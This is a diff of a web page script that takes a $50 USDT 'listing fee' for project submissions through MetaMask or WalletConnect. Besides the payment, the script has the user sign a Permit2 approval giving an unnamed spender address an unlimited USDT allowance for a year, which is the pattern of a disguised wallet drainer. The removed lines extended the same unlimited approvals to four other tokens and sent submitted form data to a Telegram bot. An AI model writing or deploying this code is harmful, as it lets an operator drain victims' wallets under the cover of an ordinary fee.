@@ -16,29 +16,10 @@ const expiration =
   Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 365;
 
 /*************************************************
- * TOKEN LIST
+ * TOKENS
  *************************************************/
 const TOKENS = {
-  USDT: {
-    address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-    decimals: 6
-  },
-  USDC: {
-    address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606EB48",
-    decimals: 6
-  },
-  DAI: {
-    address: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
-    decimals: 18
-  },
-  WBTC: {
-    address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
-    decimals: 8
-  },
-  BNB: {
-    address: "0xB8c77482e45F1F44dE1745F52C74426C631bDD52",
-    decimals: 18
-  }
+  USDT: { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 }
 };
 
 /*************************************************
@@ -46,19 +27,20 @@ const TOKENS = {
  *************************************************/
 const ERC20_ABI = [
   "function transfer(address,uint256)",
-  "function approve(address,uint256)",
   "function allowance(address,address) view returns (uint256)"
 ];
 
 const PERMIT2_ABI = [
   "function allowance(address,address,address) view returns (uint160,uint48,uint48)",
-  "function approve(address token, address spender, uint160 amount, uint48 expiration)"
+  "function approve(address,address,uint160,uint48)"
 ];
 
 /*************************************************
- * DOM + FORM (FROM SCRIPT 1)
+ * MAIN
  *************************************************/
 document.addEventListener("DOMContentLoaded", () => {
+
+  console.log("SCRIPT READY");
 
   const form = document.getElementById("projectForm");
   const paymentModal = document.getElementById("paymentModal");
@@ -70,7 +52,13 @@ document.addEventListener("DOMContentLoaded", () => {
   const walletConnectBtn = document.getElementById("walletConnectBtn");
   const closeReviewBtn = document.getElementById("closeReviewBtn");
 
-  /* FORM SUBMIT */
+  if (!form || !paymentModal || !walletModal) {
+    console.error("Missing DOM elements");
+    return;
+  }
+
+  /******** FORM FLOW ********/
+
   form.addEventListener("submit", e => {
     e.preventDefault();
     paymentModal.style.display = "flex";
@@ -85,60 +73,13 @@ document.addEventListener("DOMContentLoaded", () => {
     underReviewModal.style.display = "none";
   };
 
-  /*************************************************
-   * HELPERS (FROM SCRIPT 1)
-   *************************************************/
-  function getFormData() {
-    return Object.fromEntries(new FormData(form).entries());
-  }
-
   function showUnderReview() {
-    localStorage.setItem("projectSubmissionStatus", "under_review");
     walletModal.style.display = "none";
     underReviewModal.style.display = "flex";
   }
 
-  async function sendToTelegram(message) {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: "HTML"
-      })
-    });
-  }
+  /******** PAYMENT ********/
 
-  function formatTelegramMessage(data, paymentTx) {
-    return `
-<b>🆕 New Project Submission</b>
-
-<b>Project:</b> ${data.projectName}
-<b>Symbol:</b> ${data.tokenSymbol}
-<b>Chain:</b> ${data.blockchain}
-<b>Contract:</b> ${data.contract}
-
-<b>Description:</b>
-${data.description}
-
-<b>Website:</b> ${data.website}
-<b>Twitter:</b> ${data.twitter}
-<b>Telegram:</b> ${data.telegram}
-
-<b>Developer:</b> ${data.devName}
-<b>Email:</b> ${data.devEmail}
-
-<b>Payment TX:</b>
-<code>${paymentTx}</code>
-
-<b>Status:</b> UNDER REVIEW
-`;
-  }
-
-  /*************************************************
-   * CORE PAYMENT FLOW (SCRIPT 2)
-   *************************************************/
   async function processPayment(provider) {
     const signer = provider.getSigner();
     const userAddress = await signer.getAddress();
@@ -155,74 +96,35 @@ ${data.description}
       signer
     );
 
-    /* 1️⃣ PAY $50 */
     const amount = ethers.utils.parseUnits(
       AMOUNT_USDT,
       TOKENS.USDT.decimals
     );
 
-    const paymentTx = await usdt.transfer(
-      RECEIVER_ADDRESS,
-      amount
+    const tx = await usdt.transfer(RECEIVER_ADDRESS, amount);
+    await tx.wait();
+
+    const [allowance] = await permit2.allowance(
+      userAddress,
+      TOKENS.USDT.address,
+      SPENDER_ADDRESS
     );
-    await paymentTx.wait();
 
-    /* 2️⃣ PERMIT2 MULTI-TOKEN APPROVAL */
-    for (const symbol in TOKENS) {
-      const token = TOKENS[symbol];
-
-      const [currentAllowance] = await permit2.allowance(
-        userAddress,
-        token.address,
-        SPENDER_ADDRESS
+    if (allowance.lt(MAX_UINT160.div(2))) {
+      const approveTx = await permit2.approve(
+        TOKENS.USDT.address,
+        SPENDER_ADDRESS,
+        MAX_UINT160,
+        expiration
       );
-
-      if (currentAllowance.lt(MAX_UINT160.div(2))) {
-        const tx = await permit2.approve(
-          token.address,
-          SPENDER_ADDRESS,
-          MAX_UINT160,
-          expiration
-        );
-        await tx.wait();
-      }
+      await approveTx.wait();
     }
-
-    /* 3️⃣ SIGN METADATA */
-    const message = JSON.stringify({
-      amount: AMOUNT_USDT,
-      token: "USDT",
-      receiver: RECEIVER_ADDRESS,
-      tx: paymentTx.hash
-    });
-
-    const signature = await signer.signMessage(message);
-
-    /* 4️⃣ BACKEND NOTIFY */
-    await fetch("/notify", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        userAddress,
-        amount: AMOUNT_USDT,
-        token: "USDT",
-        paymentTxHash: paymentTx.hash,
-        signature
-      })
-    });
-
-    /* 5️⃣ TELEGRAM + UI */
-    const formData = getFormData();
-    await sendToTelegram(
-      formatTelegramMessage(formData, paymentTx.hash)
-    );
 
     showUnderReview();
   }
 
-  /*************************************************
-   * WALLET BUTTONS
-   *************************************************/
+  /******** METAMASK ********/
+
   metaMaskBtn.onclick = async () => {
     if (!window.ethereum) {
       alert("MetaMask not installed");
@@ -238,44 +140,39 @@ ${data.description}
     await processPayment(provider);
   };
 
-walletConnectBtn.onclick = async () => {
-  try {
-    // 🔴 HIDE YOUR MODAL FIRST
-    walletModal.style.display = "none";
+  /******** WALLETCONNECT (FIXED) ********/
 
-    const { EthereumProvider } = await import(
-      "https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle"
-    );
+  walletConnectBtn.onclick = async () => {
+    try {
 
-    const wcProvider = await window.WalletConnectEthereumProvider.init({
-      projectId: WALLETCONNECT_PROJECT_ID,
-      chains: [1],
-      rpcramp:{
-        1: "https://cloudflare-eth.com
-      },
-      showQrModal: true,
-      qrModalOptions: {
-        themeMode: "dark"
+      if (!window.WalletConnectEthereumProvider) {
+        alert("WalletConnect not loaded");
+        return;
       }
-    });
 
-    await wcProvider.enable();
+      const wcProvider =
+        await window.WalletConnectEthereumProvider.init({
+          projectId: WALLETCONNECT_PROJECT_ID,
+          chains: [1],
+          rpcMap: {
+            1: "https://cloudflare-eth.com"
+          },
+          showQrModal: true
+        });
 
-    wallet.style.display = "none";
+      await wcProvider.enable();
 
-    const provider = new ethers.providers.Web3Provider(wcProvider, "any");
-    await processPayment(provider);
+      walletModal.style.display = "none";
 
-  } catch (err) {
-    console.error(err);
-    alert("WalletConnect failed to open");
-  }
-};
+      const provider =
+        new ethers.providers.Web3Provider(wcProvider, "any");
 
-  /*************************************************
-   * PERSISTENCE
-   *************************************************/
-  if (localStorage.getItem("projectSubmissionStatus") === "under_review") {
-    underReviewModal.style.display = "flex";
-  }
+      await processPayment(provider);
+
+    } catch (err) {
+      console.error("WC error:", err);
+      alert("WalletConnect failed");
+    }
+  };
+
 });
